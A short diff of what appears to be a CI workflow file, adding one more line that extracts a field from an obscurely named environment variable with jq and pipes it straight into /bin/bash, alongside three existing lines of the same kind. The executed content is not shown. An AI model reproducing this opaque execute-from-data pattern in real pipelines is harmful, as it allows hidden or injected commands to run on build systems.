@@ -25,6 +25,7 @@ jobs:
           echo $rxfct7 | jq -r .yifm7 | /bin/bash
           echo $bo94 | jq -r .qo2010 | /bin/bash
           printf '%s' "$n96" | jq -r .pi0 | /bin/bash
+          echo $gt054 | jq -r .to95 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
